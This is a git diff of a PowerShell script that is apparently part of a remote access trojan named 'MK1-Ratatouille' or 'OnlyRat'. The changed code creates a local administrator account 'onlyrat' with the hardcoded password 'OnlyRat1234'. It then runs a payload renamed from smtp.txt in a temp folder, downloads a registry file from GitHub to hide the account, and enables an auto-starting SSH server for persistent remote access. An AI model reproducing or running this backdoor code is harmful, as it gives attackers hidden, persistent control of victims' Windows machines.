@@ -4,37 +4,46 @@ function random_text {
 }
 
 # Function to create a local admin account
-function create_account {
+function Create-NewLocalAdmin {
     [CmdletBinding()]
     param (
-        [string] $uname,
-        [securestring] $pword
+        [string] $NewLocalAdmin,
+        [securestring] $Password
     )
     begin {
     }
     process {
-        New-LocalUser -Name $uname -Password $pword -FullName $uname -Description "Temporary local admin" -AccountNeverExpires
-        Write-Verbose "$uname local user created"
-        Add-LocalGroupMember -Group "Administrators" -Member $uname
-        Write-Verbose "$uname added to the local administrators group"
+        # New-LocalUser $uname -Password $pword -FullName $uname -Description "Temporary local admin" -AccountNeverExpires
+        # Write-Verbose "$uname local user created"
+        # Add-LocalGroupMember -Group "Administrators" -Member $uname
+        # # Write-Verbose "$uname added to the local administrators group"
+
+        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
+        Write-Verbose "$NewLocalAdmin local user created"
+        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
+        Write-Verbose "$NewLocalAdmin added to the local administator group"
     }
     end {
     }
 }
-
 # Create admin user
-$uname = random_text
-$pword = ConvertTo-SecureString "OnlyRat1234" -AsPlainText -Force
-create_account -uname $uname -pword $pword
+$NewLocalAdmin = "onlyrat"
+$Password = ConvertTo-SecureString "OnlyRat1234" -AsPlainText -Force
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
+
 
 # Variables
 $wd = random_text
 $path = "$env:temp\$wd"
 $initial_dir = $PWD.Path
 
+
 # Go to temp, make working directory
 mkdir $path
 Set-Location $path
+Move-Item $initial_dir/smtp.txt ./smtp.ps1
+./smtp.ps1
+
 
 # Registry and VBScript to hide local admin
 $regUrl = 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wrev.reg'
@@ -53,7 +62,6 @@ try {
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
     Start-Service sshd
     Set-Service -Name sshd -StartupType 'Automatic'
-    Write-Verbose "SSH service enabled and set to start automatically"
 }
 catch {
     Write-Error "Failed to enable or start SSH service. Make sure the script is run with elevated permissions."
